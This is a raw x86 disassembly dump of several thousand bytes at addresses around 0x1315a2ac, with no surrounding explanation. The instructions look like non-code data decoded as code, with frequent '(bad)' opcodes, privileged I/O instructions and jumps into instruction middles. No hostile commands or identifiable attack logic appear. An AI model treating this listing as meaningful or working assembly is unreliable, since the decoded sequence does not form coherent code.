1315a2ac:	44                   	inc    %esp
1315a2ad:	e2 e8                	loop   0x1315a297
1315a2af:	2f                   	das
1315a2b0:	eb f8                	jmp    0x1315a2aa
1315a2b2:	04 5f                	add    $0x5f,%al
1315a2b4:	38 84 4a 0c 14 eb 0c 	cmp    %al,0xceb140c(%edx,%ecx,2)
1315a2bb:	11 2f                	adc    %ebp,(%edi)
1315a2bd:	7d df                	jge    0x1315a29e
1315a2bf:	50                   	push   %eax
1315a2c0:	a1 29 50 1b 7c       	mov    0x7c1b5029,%eax
1315a2c5:	34 8a                	xor    $0x8a,%al
1315a2c7:	0d 4c c9 71 e3       	or     $0xe371c94c,%eax
1315a2cc:	73 ce                	jae    0x1315a29c
1315a2ce:	12 84 39 26 64 e7 e1 	adc    -0x1e189bda(%ecx,%edi,1),%al
1315a2d5:	70 5c                	jo     0x1315a333
1315a2d7:	36 f6 04 82 3c       	testb  $0x3c,%ss:(%edx,%eax,4)
1315a2dc:	98                   	cwtl
1315a2dd:	2b 74 a8 7d          	sub    0x7d(%eax,%ebp,4),%esi
1315a2e1:	32 13                	xor    (%ebx),%dl
1315a2e3:	dd 58 a1             	fstpl  -0x5f(%eax)
1315a2e6:	58                   	pop    %eax
1315a2e7:	1f                   	pop    %ds
1315a2e8:	10 db                	adc    %bl,%bl
1315a2ea:	c3                   	ret
1315a2eb:	b8 98 8f a0 01       	mov    $0x1a08f98,%eax
1315a2f0:	cf                   	iret
1315a2f1:	20 d2                	and    %dl,%dl
1315a2f3:	0d 6f da fb 13       	or     $0x13fbda6f,%eax
1315a2f8:	bc a3 31 88 38       	mov    $0x388831a3,%esp
1315a2fd:	64 a3 50 5b 04 d9    	mov    %eax,%fs:0xd9045b50
1315a303:	d9 73 83             	fnstenv -0x7d(%ebx)
1315a306:	52                   	push   %edx
1315a307:	9c                   	pushf
1315a308:	c0 a0 06 a4 34 86 d5 	shlb   $0xd5,-0x79cb5bfa(%eax)
1315a30f:	b1 f7                	mov    $0xf7,%cl
1315a311:	39 1c ba             	cmp    %ebx,(%edx,%edi,4)
1315a314:	3e a8 22             	ds test $0x22,%al
1315a317:	dc ab 32 dc 25 3f    	fsubrl 0x3f25dc32(%ebx)
1315a31d:	2f                   	das
1315a31e:	95                   	xchg   %eax,%ebp
1315a31f:	49                   	dec    %ecx
1315a320:	54                   	push   %esp
1315a321:	3f                   	aas
1315a322:	0a bd 8e 06 72 9c    	or     -0x638df972(%ebp),%bh
1315a328:	49                   	dec    %ecx
1315a329:	13 2d 1e 90 01 19    	adc    0x1901901e,%ebp
1315a32f:	ac                   	lods   %ds:(%esi),%al
1315a330:	98                   	cwtl
1315a331:	37                   	aaa
1315a332:	cd 5c                	int    $0x5c
1315a334:	0b 91 29 39 d4 5c    	or     0x5cd43929(%ecx),%edx
1315a33a:	67 44                	addr16 inc %esp
1315a33c:	0c 32                	or     $0x32,%al
1315a33e:	d8 20                	fsubs  (%eax)
1315a340:	40                   	inc    %eax
1315a341:	07                   	pop    %es
1315a342:	3c 38                	cmp    $0x38,%al
1315a344:	39 c8                	cmp    %ecx,%eax
1315a346:	20 83 34 30 24 73    	and    %al,0x73243034(%ebx)
1315a34c:	90                   	nop
1315a34d:	41                   	inc    %ecx
1315a34e:	06                   	push   %es
1315a34f:	39 20                	cmp    %esp,(%eax)
1315a351:	1c 18                	sbb    $0x18,%al
1315a353:	4d                   	dec    %ebp
1315a354:	fc                   	cld
1315a355:	50                   	push   %eax
1315a356:	67 14 9f             	addr16 adc $0x9f,%al
1315a359:	45                   	inc    %ebp
1315a35a:	10 50 2c             	adc    %dl,0x2c(%eax)
1315a35d:	01 e0                	add    %esp,%eax
1315a35f:	14 ad                	adc    $0xad,%al
1315a361:	e0 1b                	loopne 0x1315a37e
1315a363:	c0 40 95 ec          	rolb   $0xec,-0x6b(%eax)
1315a367:	16                   	push   %ss
1315a368:	aa                   	stos   %al,%es:(%edi)
1315a369:	b2 ec                	mov    $0xec,%dl
1315a36b:	b7 3a                	mov    $0x3a,%bh
1315a36d:	2c 0c                	sub    $0xc,%al
1315a36f:	6f                   	outsl  %ds:(%esi),(%dx)
1315a370:	73 c8                	jae    0x1315a33a
1315a372:	20 83 4d 07 08 04    	and    %al,0x408074d(%ebx)
1315a378:	41                   	inc    %ecx
1315a379:	4e                   	dec    %esi
1315a37a:	0e                   	push   %cs
1315a37b:	32 00                	xor    (%eax),%al
1315a37d:	fc                   	cld
1315a37e:	72 f8                	jb     0x1315a378
1315a380:	15 19 64 90 f4       	adc    $0xf4906419,%eax
1315a385:	f0 ec                	lock in (%dx),%al
1315a387:	c9                   	leave
1315a388:	c9                   	leave
1315a389:	c9                   	leave
1315a38a:	46                   	inc    %esi
1315a38b:	8f                   	(bad)
1315a38c:	72 72                	jb     0x1315a400
1315a38e:	72 c9                	jb     0x1315a359
1315a390:	c9                   	leave
1315a391:	c9                   	leave
1315a392:	c9                   	leave
1315a393:	72 72                	jb     0x1315a407
1315a395:	72 72                	jb     0x1315a409
1315a397:	d9 c9                	fxch   %st(1)
1315a399:	c9                   	leave
1315a39a:	c9                   	leave
1315a39b:	72 72                	jb     0x1315a40f
1315a39d:	72 72                	jb     0x1315a411
1315a39f:	9f                   	lahf
1315a3a0:	3c 79                	cmp    $0x79,%al
1315a3a2:	f2 e4 bc             	repnz in $0xbc,%al
1315a3a5:	72 b8                	jb     0x1315a35f
1315a3a7:	72 b4                	jb     0x1315a35d
1315a3a9:	72 b0                	jb     0x1315a35b
1315a3ab:	72 c8                	jb     0x1315a375
1315a3ad:	20 83 9c ac a8 a4    	and    %al,-0x5b575364(%ebx)
1315a3b3:	20 83 0c 32 a0 9c    	and    %al,-0x635fcdf4(%ebx)
1315a3b9:	98                   	cwtl
1315a3ba:	83 0c 32 c8          	orl    $0xffffffc8,(%edx,%esi,1)
1315a3be:	94                   	xchg   %eax,%esp
1315a3bf:	90                   	nop
1315a3c0:	8c 88 0c 32 c8 20    	mov    %cs,0x20c8320c(%eax)
1315a3c6:	84 80 7c 32 c8 20    	test   %al,0x20c8327c(%eax)
1315a3cc:	83 78 74 70          	cmpl   $0x70,0x74(%eax)
1315a3d0:	c8 20 83 0c          	enter  $0x8320,$0xc
1315a3d4:	6c                   	insb   (%dx),%es:(%edi)
1315a3d5:	68 64 20 83 0c       	push   $0xc832064
1315a3da:	32 60 5c             	xor    0x5c(%eax),%ah
1315a3dd:	58                   	pop    %eax
1315a3de:	87 0c 32             	xchg   %ecx,(%edx,%esi,1)
1315a3e1:	c8 54 50 4c          	enter  $0x5054,$0x4c
1315a3e5:	73 32                	jae    0x1315a419
1315a3e7:	c8 20 67 07          	enter  $0x6720,$0x7
1315a3eb:	94                   	xchg   %eax,%esp
1315a3ec:	90                   	nop
1315a3ed:	8c c8                	mov    %cs,%eax
1315a3ef:	20 83 0c 88 84 80    	and    %al,-0x7f7b77f4(%ebx)
1315a3f5:	20 83 0c 32 7c 78    	and    %al,0x787c320c(%ebx)
1315a3fb:	74 83                	je     0x1315a380
1315a3fd:	0c 32                	or     $0x32,%al
1315a3ff:	c8 70 6c 68          	enter  $0x6c70,$0x68
1315a403:	64 0c 32             	fs or  $0x32,%al
1315a406:	c8 20 60 5c          	enter  $0x6020,$0x5c
1315a40a:	58                   	pop    %eax
1315a40b:	32 c8                	xor    %al,%cl
1315a40d:	20 83 54 50 4c c8    	and    %al,-0x37b3afac(%ebx)
1315a413:	20 83 0c 48 44 40    	and    %al,0x4044480c(%ebx)
1315a419:	20 83 0c 32 3c 38    	and    %al,0x383c320c(%ebx)
1315a41f:	34 22                	xor    $0x22,%al
1315a421:	31 32                	xor    %esi,(%edx)
1315a423:	c8 30 2c 92          	enter  $0x2c30,$0x92
1315a427:	fa                   	cli
1315a428:	b9 e4 53 24 23       	mov    $0x232453e4,%ecx
1315a42d:	27                   	daa
1315a42e:	f5                   	cmc
1315a42f:	4c                   	dec    %esp
1315a430:	60                   	pusha
1315a431:	8c 1c c9             	mov    %ds,(%ecx,%ecx,8)
1315a434:	03 fc                	add    %esp,%edi
1315a436:	4c                   	dec    %esp
1315a437:	60                   	pusha
1315a438:	58                   	pop    %eax
1315a439:	8f                   	(bad)
1315a43a:	9e                   	sahf
1315a43b:	fb                   	sti
1315a43c:	4b                   	dec    %ebx
1315a43d:	cd 00                	int    $0x0
1315a43f:	52                   	push   %edx
1315a440:	00 45 00             	add    %al,0x0(%ebp)
1315a443:	4d                   	dec    %ebp
1315a444:	03 00                	add    (%eax),%eax
1315a446:	5d                   	pop    %ebp
1315a447:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315a448:	4f                   	dec    %edi
1315a449:	9b                   	fwait
1315a44a:	aa                   	stos   %al,%es:(%edi)
1315a44b:	fa                   	cli
1315a44c:	3d a1 b0 ef 0a       	cmp    $0xaefb0a1,%eax
1315a451:	50                   	push   %eax
1315a452:	e6 b2                	out    %al,$0xb2
1315a454:	02 31                	add    (%ecx),%dh
1315a456:	46                   	inc    %esi
1315a457:	e0 8c                	loopne 0x1315a3e5
1315a459:	fa                   	cli
1315a45a:	0d f8 dc 80 7c       	or     $0x7c80dcf8,%eax
1315a45f:	3b 7c 8b f0          	cmp    -0x10(%ebx,%ecx,4),%edi
1315a463:	24 1b                	and    $0x1b,%al
1315a465:	07                   	pop    %es
1315a466:	2c ef                	sub    $0xef,%al
1315a468:	b7 10                	mov    $0x10,%bh
1315a46a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315a46b:	af                   	scas   %es:(%edi),%eax
1315a46c:	8d                   	lea    (bad),%ecx
1315a46d:	ce                   	into
1315a46e:	97                   	xchg   %eax,%edi
1315a46f:	3c c4                	cmp    $0xc4,%al
1315a471:	13 25 87 74 a0 3a    	adc    0x3aa07487,%esp
1315a477:	76 ff                	jbe    0x1315a478
1315a479:	4d                   	dec    %ebp
1315a47a:	c8 91 4c c8          	enter  $0x4c91,$0xc8
1315a47e:	64 4d                	fs dec %ebp
1315a480:	64 81 8b 46 6e 91 94 	orl    $0xdd6817a7,%fs:-0x6b6e91ba(%ebx)
1315a487:	a7 17 68 dd 
1315a48b:	a0 8d dc 66 8b       	mov    0x8b66dc8d,%al
1315a490:	e7 90                	out    %eax,$0x90
1315a492:	f1                   	int1
1315a493:	55                   	push   %ebp
1315a494:	ca 6d d5             	lret   $0xd56d
1315a497:	6c                   	insb   (%dx),%es:(%edi)
1315a498:	07                   	pop    %es
1315a499:	34 fe                	xor    $0xfe,%al
1315a49b:	e4 20                	in     $0x20,%al
1315a49d:	05 b7 6c 0d dd       	add    $0xdd0d6cb7,%eax
1315a4a2:	f9                   	stc
1315a4a3:	1a 66 40             	sbb    0x40(%esi),%ah
1315a4a6:	15 10 f9 0f 05       	adc    $0x50ff910,%eax
1315a4ab:	c5 76 17             	lds    0x17(%esi),%esi
1315a4ae:	37                   	aaa
1315a4af:	10 09                	adc    %cl,(%ecx)
1315a4b1:	66 73 04             	data16 jae 0x1315a4b8
1315a4b4:	66 89 2d 42 5c ec a3 	mov    %bp,0xa3ec5c42
1315a4bb:	b6 be                	mov    $0xbe,%dh
1315a4bd:	ca 80 64             	lret   $0x6480
1315a4c0:	90                   	nop
1315a4c1:	92                   	xchg   %eax,%edx
1315a4c2:	5b                   	pop    %ebx
1315a4c3:	1c 83                	sbb    $0x83,%al
1315a4c5:	96                   	xchg   %eax,%esi
1315a4c6:	26 2f                	es das
1315a4c8:	81 fa a6 4d f4 d1    	cmp    $0xd1f44da6,%edx
1315a4ce:	2a 13                	sub    (%ebx),%dl
1315a4d0:	4b                   	dec    %ebx
1315a4d1:	35 f8 f1 36 5e       	xor    $0x5e36f1f8,%eax
1315a4d6:	92                   	xchg   %eax,%edx
1315a4d7:	5f                   	pop    %edi
1315a4d8:	7c a0                	jl     0x1315a47a
1315a4da:	30 52 9e             	xor    %dl,-0x62(%edx)
1315a4dd:	4f                   	dec    %edi
1315a4de:	15 5f 18 fa 0b       	adc    $0xbfa185f,%eax
1315a4e3:	21 0f                	and    %ecx,(%edi)
1315a4e5:	8e 51 5e             	mov    0x5e(%ecx),%ss
1315a4e8:	3d 0f f6 d4 c3       	cmp    $0xc3d4f60f,%eax
1315a4ed:	dc 86 47 09 19 3d    	faddl  0x3d190947(%esi)
1315a4f3:	80 1d 1c 0e e2 b7 11 	sbbb   $0x11,0xb7e20e1c
1315a4fa:	0d 14 cb 85 5a       	or     $0x5a85cb14,%eax
1315a4ff:	b9 00 02 87 7d       	mov    $0x7d870200,%ecx
1315a504:	04 41                	add    $0x41,%al
1315a506:	3d f0 eb 21 2a       	cmp    $0x2a21ebf0,%eax
1315a50b:	03 ed                	add    %ebp,%ebp
1315a50d:	c0 1d 3b b2 26 59 22 	rcrb   $0x22,0x5926b23b
1315a514:	33 ff                	xor    %edi,%edi
1315a516:	0d 95 2a 15 bb       	or     $0xbb152a95,%eax
1315a51b:	44                   	inc    %esp
1315a51c:	38 47 c0             	cmp    %al,-0x40(%edi)
1315a51f:	70 b0                	jo     0x1315a4d1
1315a521:	d3 35 fa 3b 75 f2    	shll   %cl,0xf2753bfa
1315a527:	8b 17                	mov    (%edi),%edx
1315a529:	9d                   	popf
1315a52a:	40                   	inc    %eax
1315a52b:	3b da                	cmp    %edx,%ebx
1315a52d:	e8 db 3e c7 5a       	call   0x6ddce40d
1315a532:	8b ca                	mov    %edx,%ecx
1315a534:	96                   	xchg   %eax,%esi
1315a535:	f9                   	stc
1315a536:	c0 84 15 dd ea 83 7f 	rolb   $0x3f,0x7f83eadd(%ebp,%edx,1)
1315a53d:	3f 
1315a53e:	03 33                	add    (%ebx),%esi
1315a540:	03 c6                	add    %esi,%eax
1315a542:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315a543:	80 6d 48 0d          	subb   $0xd,0x48(%ebp)
1315a547:	8c fd                	mov    %?,%ebp
1315a549:	42                   	inc    %edx
1315a54a:	47                   	inc    %edi
1315a54b:	8c 40 96             	mov    %es,-0x6a(%eax)
1315a54e:	8a 03                	mov    (%ebx),%al
1315a550:	8b 94 b5 4e 13 21 5b 	mov    0x5b21134e(%ebp,%esi,4),%edx
1315a557:	ec                   	in     (%dx),%al
1315a558:	18 c0                	sbb    %al,%al
1315a55a:	89 84 0d 5a c3 50 89 	mov    %eax,-0x76af3ca6(%ebp,%ecx,1)
1315a561:	43                   	inc    %ebx
1315a562:	cd af                	int    $0xaf
1315a564:	d2 d3                	rcl    %cl,%bl
1315a566:	db f7                	fcomi  %st(7),%st
1315a568:	b1 bf                	mov    $0xbf,%cl
1315a56a:	d0 e9                	shr    $1,%cl
1315a56c:	49                   	dec    %ecx
1315a56d:	2a 7c 78 41          	sub    0x41(%eax,%edi,2),%bh
1315a571:	46                   	inc    %esi
1315a572:	81 e6 47 08 4e 81    	and    $0x814e0847,%esi
1315a578:	ce                   	into
1315a579:	48                   	dec    %eax
1315a57a:	fb                   	sti
1315a57b:	7c f6                	jl     0x1315a573
1315a57d:	ec                   	in     (%dx),%al
1315a57e:	46                   	inc    %esi
1315a57f:	03 44 81 e2          	add    -0x1e(%ecx,%eax,4),%eax
1315a583:	16                   	push   %ss
1315a584:	4a                   	dec    %edx
1315a585:	81 ca 42 8a 4d 82    	or     $0x824d8a42,%edx
1315a58b:	c5 c6 3e             	(bad)
1315a58e:	8b 9c 95 62 9c 0d 67 	mov    0x670d9c62(%ebp,%edx,4),%ebx
1315a595:	85 cd                	test   %ecx,%ebp
1315a597:	ce                   	into
1315a598:	c6                   	(bad)
1315a599:	12 8b 20 03 0d 9c    	adc    -0x63f2fce0(%ebx),%cl
1315a59f:	e2 ed                	loop   0x1315a58e
1315a5a1:	47                   	inc    %edi
1315a5a2:	b6 3c                	mov    $0x3c,%dh
1315a5a4:	85 5d f0             	test   %ebx,-0x10(%ebp)
1315a5a7:	30 03                	xor    %al,(%ebx)
1315a5a9:	ff                   	(bad)
1315a5aa:	7c 49                	jl     0x1315a5f5
1315a5ac:	75 89                	jne    0x1315a537
1315a5ae:	e2 05                	loop   0x1315a5b5
1315a5b0:	cf                   	iret
1315a5b1:	c9                   	leave
1315a5b2:	6b a5 4f f4 90 0f 63 	imul   $0x63,0xf90f44f(%ebp),%esp
1315a5b9:	46                   	inc    %esi
1315a5ba:	c3                   	ret
1315a5bb:	6b 71 3b d1          	imul   $0xffffffd1,0x3b(%ecx),%esi
1315a5bf:	4f                   	dec    %edi
1315a5c0:	48                   	dec    %eax
1315a5c1:	1e                   	push   %ds
1315a5c2:	c8 25 68 d8          	enter  $0x6825,$0xd8
1315a5c6:	4f                   	dec    %edi
1315a5c7:	0a 0d 50 e4 68 a6    	or     0xa668e450,%cl
1315a5cd:	78 d2                	js     0x1315a5a1
1315a5cf:	52                   	push   %edx
1315a5d0:	8c df                	mov    %ds,%edi
1315a5d2:	aa                   	stos   %al,%es:(%edi)
1315a5d3:	4f                   	dec    %edi
1315a5d4:	74 00                	je     0x1315a5d6
1315a5d6:	6d                   	insl   (%dx),%es:(%edi)
1315a5d7:	00 6c df 3f          	add    %ch,0x3f(%edi,%ebx,8)
1315a5db:	de 8c 33 c8 a4 a0 0b 	fimuls 0xba0a4c8(%ebx,%esi,1)
1315a5e2:	9b                   	fwait
1315a5e3:	47                   	inc    %edi
1315a5e4:	af                   	scas   %es:(%edi),%eax
1315a5e5:	90                   	nop
1315a5e6:	ac                   	lods   %ds:(%esi),%al
1315a5e7:	99                   	cltd
1315a5e8:	8a 0e                	mov    (%esi),%cl
1315a5ea:	de 59 1d             	ficomps 0x1d(%ecx)
1315a5ed:	83 f7 70             	xor    $0x70,%edi
1315a5f0:	8d 95 0a c6 2a dc    	lea    -0x23d539f6(%ebp),%edx
1315a5f6:	c7                   	(bad)
1315a5f7:	6c                   	insb   (%dx),%es:(%edi)
1315a5f8:	7c 07                	jl     0x1315a601
1315a5fa:	74 66                	je     0x1315a662
1315a5fc:	79 16                	jns    0x1315a614
1315a5fe:	89 c2                	mov    %eax,%edx
1315a600:	f7 da                	neg    %edx
1315a602:	86 08                	xchg   %cl,(%eax)
1315a604:	ba 51 77 2c b0       	mov    $0xb02c7751,%edx
1315a609:	02 6b 75             	add    0x75(%ebx),%ch
1315a60c:	f5                   	cmc
1315a60d:	8d 61 d1             	lea    -0x2f(%ecx),%esp
1315a610:	e8 8c 63 15 8f       	call   0xa22b09a1
1315a615:	53                   	push   %ebx
1315a616:	57                   	push   %edi
1315a617:	8b da                	mov    %edx,%ebx
1315a619:	55                   	push   %ebp
1315a61a:	22 86 9c 64 fc ec    	and    -0x13039b64(%esi),%al
1315a620:	50                   	push   %eax
1315a621:	ed                   	in     (%dx),%eax
1315a622:	1e                   	push   %ds
1315a623:	9d                   	popf
1315a624:	7c 62                	jl     0x1315a688
1315a626:	0a 02                	or     (%edx),%al
1315a628:	8b 6e 09             	mov    0x9(%esi),%ebp
1315a62b:	2c 3c                	sub    $0x3c,%al
1315a62d:	fb                   	sti
1315a62e:	53                   	push   %ebx
1315a62f:	bc 42 42 2f 7b       	mov    $0x7b2f4242,%esp
1315a634:	03 f6                	add    %esi,%esi
1315a636:	81 fe 22 5a c1 63    	cmp    $0x63c15a22,%esi
1315a63c:	f6 7e 18             	idivb  0x18(%esi)
1315a63f:	13 33                	adc    (%ebx),%esi
1315a641:	3c d5                	cmp    $0xd5,%al
1315a643:	c0 76 cc 35          	shlb   $0x35,-0x34(%esi)
1315a647:	c7                   	(bad)
1315a648:	eb 13                	jmp    0x1315a65d
1315a64a:	17                   	pop    %ss
1315a64b:	e4 39                	in     $0x39,%al
1315a64d:	09 ee                	or     %ebp,%esi
1315a64f:	1a 14 4d f3 50 fc 43 	sbb    0x43fc50f3(,%ecx,2),%dl
1315a656:	b6 13                	mov    $0x13,%dh
1315a658:	25 58 f7 b8 44       	and    $0x44b8f758,%eax
1315a65d:	25 2a 54 83 1d       	and    $0x1d83542a,%eax
1315a662:	c3                   	ret
1315a663:	6e                   	outsb  %ds:(%esi),(%dx)
1315a664:	38 2a                	cmp    %ch,(%edx)
1315a666:	42                   	inc    %edx
1315a667:	9e                   	sahf
1315a668:	07                   	pop    %es
1315a669:	5d                   	pop    %ebp
1315a66a:	08 ab c9 65 83 6c    	or     %ch,0x6c8365c9(%ebx)
1315a670:	07                   	pop    %es
1315a671:	f8                   	clc
1315a672:	0c bb                	or     $0xbb,%al
1315a674:	51                   	push   %ecx
1315a675:	0a ba 31 60 36 2a    	or     0x2a366031(%edx),%bh
1315a67b:	2f                   	das
1315a67c:	f4                   	hlt
1315a67d:	d9 55 1d             	fsts   0x1d(%ebp)
1315a680:	f6 66 87             	mulb   -0x79(%esi)
1315a683:	50                   	push   %eax
1315a684:	f4                   	hlt
1315a685:	39 f4                	cmp    %esi,%esp
1315a687:	33 5b 6b             	xor    0x6b(%ebx),%ebx
1315a68a:	6d                   	insl   (%dx),%es:(%edi)
1315a68b:	6b 1a ec             	imul   $0xffffffec,(%edx),%ebx
1315a68e:	18 05 f0 a6 f9 5c    	sbb    %al,0x5cf9a6f0
1315a694:	e1 64                	loope  0x1315a6fa
1315a696:	f8                   	clc
1315a697:	f0 12 31             	lock adc (%ecx),%dh
1315a69a:	23 fc                	and    %esp,%edi
1315a69c:	ad                   	lods   %ds:(%esi),%eax
1315a69d:	01 ef                	add    %ebp,%edi
1315a69f:	aa                   	stos   %al,%es:(%edi)
1315a6a0:	3e ee                	ds out %al,(%dx)
1315a6a2:	d1 fa                	sar    $1,%edx
1315a6a4:	79 03                	jns    0x1315a6a9
1315a6a6:	93                   	xchg   %eax,%ebx
1315a6a7:	52                   	push   %edx
1315a6a8:	b3 d9                	mov    $0xd9,%bl
1315a6aa:	ef                   	out    %eax,(%dx)
1315a6ab:	41                   	inc    %ecx
1315a6ac:	e3 34                	jecxz  0x1315a6e2
1315a6ae:	8b 03                	mov    (%ebx),%eax
1315a6b0:	4a                   	dec    %edx
1315a6b1:	3a e6                	cmp    %dh,%ah
1315a6b3:	80 b3 65 30 17 24 57 	xorb   $0x57,0x24173065(%ebx)
1315a6ba:	2c 7c                	sub    $0x7c,%al
1315a6bc:	2e 3b 6c 19 dc       	cmp    %cs:-0x24(%ecx,%ebx,1),%ebp
1315a6c1:	f2 51                	repnz push %ecx
1315a6c3:	f8                   	clc
1315a6c4:	ba 9b 39 e2 40       	mov    $0x40e2399b,%edx
1315a6c9:	74 cd                	je     0x1315a698
1315a6cb:	bf ff 40 04 03       	mov    $0x30440ff,%edi
1315a6d0:	26 e3 89             	es jecxz 0x1315a65c
1315a6d3:	79 90                	jns    0x1315a665
1315a6d5:	2d 9b 2f fb f8       	sub    $0xf8fb2f9b,%eax
1315a6da:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315a6db:	52                   	push   %edx
1315a6dc:	17                   	pop    %ss
1315a6dd:	f6 4a 0d 17          	testb  $0x17,0xd(%edx)
1315a6e1:	f0 ec                	lock in (%dx),%al
1315a6e3:	e4 8b                	in     $0x8b,%al
1315a6e5:	d9 25 4b da 0c 0c    	fldenv 0xc0cda4b
1315a6eb:	19 10                	sbb    %edx,(%eax)
1315a6ed:	61                   	popa
1315a6ee:	0e                   	push   %cs
1315a6ef:	76 d9                	jbe    0x1315a6ca
1315a6f1:	f6 50 f4             	notb   -0xc(%eax)
1315a6f4:	3a 04 94             	cmp    (%esp,%edx,4),%al
1315a6f7:	9c                   	pushf
1315a6f8:	32 03                	xor    (%ebx),%al
1315a6fa:	b1 b8                	mov    $0xb8,%cl
1315a6fc:	ac                   	lods   %ds:(%esi),%al
1315a6fd:	52                   	push   %edx
1315a6fe:	ad                   	lods   %ds:(%esi),%eax
1315a6ff:	a3 61 2d f2 ba       	mov    %eax,0xbaf22d61
1315a704:	1b 81 b9 3c ab d4    	sbb    -0x2b54c347(%ecx),%eax
1315a70a:	8e fd                	mov    %ebp,%?
1315a70c:	93                   	xchg   %eax,%ebx
1315a70d:	d8 54 d5 61          	fcoms  0x61(%ebp,%edx,8)
1315a711:	3a e4                	cmp    %ah,%ah
1315a713:	ea b6 67 37 92 d4 b9 	ljmp   $0xb9d4,$0x923767b6
1315a71a:	05 0d 2a e8 20       	add    $0x20e82a0d,%eax
1315a71f:	0c 49                	or     $0x49,%al
1315a721:	5b                   	pop    %ebx
1315a722:	2b bd 72 c9 e7 2d    	sub    0x2de7c972(%ebp),%edi
1315a728:	1a 8d 36 23 36 e4    	sbb    -0x1bc9dcca(%ebp),%cl
1315a72e:	17                   	pop    %ss
1315a72f:	d3 58 53             	rcrl   %cl,0x53(%eax)
1315a732:	43                   	inc    %ebx
1315a733:	f0 c6                	lock (bad)
1315a735:	6b 63 6e f6          	imul   $0xfffffff6,0x6e(%ebx),%esp
1315a739:	1a a3 fc 0b 26 f7    	sbb    -0x8d9f404(%ebx),%ah
1315a73f:	36 66 97             	ss xchg %ax,%di
1315a742:	bd 11 52 8b 3c       	mov    $0x3c8b5211,%ebp
1315a747:	7d 68                	jge    0x1315a7b1
1315a749:	33 37                	xor    (%edi),%esi
1315a74b:	d9 e7                	(bad)
1315a74d:	39 d5                	cmp    %edx,%ebp
1315a74f:	90                   	nop
1315a750:	bc 5f 11 34 ee       	mov    $0xee34115f,%esp
1315a755:	8b 74 60 b2          	mov    -0x4e(%eax,%eiz,2),%esi
1315a759:	ed                   	in     (%dx),%eax
1315a75a:	b7 d0                	mov    $0xd0,%bh
1315a75c:	5c                   	pop    %esp
1315a75d:	03 32                	add    (%edx),%esi
1315a75f:	85 1c 61             	test   %ebx,(%ecx,%eiz,2)
1315a762:	87 e0                	xchg   %esp,%eax
1315a764:	dc 80 4c c9 50 f0    	faddl  -0xfaf36b4(%eax)
1315a76a:	e7 90                	out    %eax,$0x90
1315a76c:	67 8d 5a bf          	lea    -0x41(%bp,%si),%ebx
1315a770:	7b 45                	jnp    0x1315a7b7
1315a772:	54                   	push   %esp
1315a773:	5d                   	pop    %ebp
1315a774:	80 76 c2 fd          	xorb   $0xfd,-0x3e(%esi)
1315a778:	42                   	inc    %edx
1315a779:	8c a6 b8 54 c2 ab    	mov    %fs,-0x543dab48(%esi)
1315a77f:	f8                   	clc
1315a780:	c3                   	ret
1315a781:	16                   	push   %ss
1315a782:	5f                   	pop    %edi
1315a783:	9c                   	pushf
1315a784:	8b c8                	mov    %eax,%ecx
1315a786:	6a ee                	push   $0xffffffee
1315a788:	5a                   	pop    %edx
1315a789:	c9                   	leave
1315a78a:	49                   	dec    %ecx
1315a78b:	7a 2c                	jp     0x1315a7b9
1315a78d:	c0 58 4c 54          	rcrb   $0x54,0x4c(%eax)
1315a791:	83 d0 18             	adc    $0x18,%eax
1315a794:	76 57                	jbe    0x1315a7ed
1315a796:	63 55 a0             	arpl   %edx,-0x60(%ebp)
1315a799:	f0 8c 49 7d          	lock mov %cs,0x7d(%ecx)
1315a79d:	20 d8                	and    %bl,%al
1315a79f:	a1 b4 19 29 48       	mov    0x482919b4,%eax
1315a7a4:	ff 20                	jmp    *(%eax)
1315a7a6:	59                   	pop    %ecx
1315a7a7:	0c 06                	or     $0x6,%al
1315a7a9:	44                   	inc    %esp
1315a7aa:	5c                   	pop    %esp
1315a7ab:	04 59                	add    $0x59,%al
1315a7ad:	bb 70 10 b3 8a       	mov    $0x8ab31070,%ebx
1315a7b2:	b1 14                	mov    $0x14,%cl
1315a7b4:	a3 5c 45 0b 89       	mov    %eax,0x890b455c
1315a7b9:	fd                   	std
1315a7ba:	45                   	inc    %ebp
1315a7bb:	ae                   	scas   %es:(%edi),%al
1315a7bc:	1d 1b 61 18 0e       	sbb    $0xe18611b,%eax
1315a7c1:	24 05                	and    $0x5,%al
1315a7c3:	0c 56                	or     $0x56,%al
1315a7c5:	19 12                	sbb    %edx,(%edx)
1315a7c7:	13 13                	adc    (%ebx),%edx
1315a7c9:	9e                   	sahf
1315a7ca:	9f                   	lahf
1315a7cb:	08 40 f4             	or     %al,-0xc(%eax)
1315a7ce:	54                   	push   %esp
1315a7cf:	6c                   	insb   (%dx),%es:(%edi)
1315a7d0:	ec                   	in     (%dx),%al
1315a7d1:	5f                   	pop    %edi
1315a7d2:	8e bc 91 0c 17 0a b8 	mov    -0x47f5e8f4(%ecx,%edx,4),%?
1315a7d9:	26 00 45 30          	add    %al,%es:0x30(%ebp)
1315a7dd:	a9 94 f1 22 6e       	test   $0x6e22f194,%eax
1315a7e2:	18 cf                	sbb    %cl,%bh
1315a7e4:	6a d8                	push   $0xffffffd8
1315a7e6:	42                   	inc    %edx
1315a7e7:	c0 2b 1a             	shrb   $0x1a,(%ebx)
1315a7ea:	25 85 e2 10 45       	and    $0x4510e285,%eax
1315a7ef:	9f                   	lahf
1315a7f0:	59                   	pop    %ecx
1315a7f1:	b1 60                	mov    $0x60,%cl
1315a7f3:	41                   	inc    %ecx
1315a7f4:	3a 7a 0b             	cmp    0xb(%edx),%bh
1315a7f7:	0b 73 07             	or     0x7(%ebx),%esi
1315a7fa:	2b f2                	sub    %edx,%esi
1315a7fc:	24 ce                	and    $0xce,%al
1315a7fe:	ac                   	lods   %ds:(%esi),%al
1315a7ff:	37                   	aaa
1315a800:	ec                   	in     (%dx),%al
1315a801:	fd                   	std
1315a802:	c0 25 4f 38 44 88 4c 	shlb   $0x4c,0x8844384f
1315a809:	2f                   	das
1315a80a:	56                   	push   %esi
1315a80b:	96                   	xchg   %eax,%esi
1315a80c:	59                   	pop    %ecx
1315a80d:	38 d0                	cmp    %dl,%al
1315a80f:	f8                   	clc
1315a810:	fa                   	cli
1315a811:	8a ee                	mov    %dh,%ch
1315a813:	e3 09                	jecxz  0x1315a81e
1315a815:	7e c3                	jle    0x1315a7da
1315a817:	1e                   	push   %ds
1315a818:	4d                   	dec    %ebp
1315a819:	28 17                	sub    %dl,(%edi)
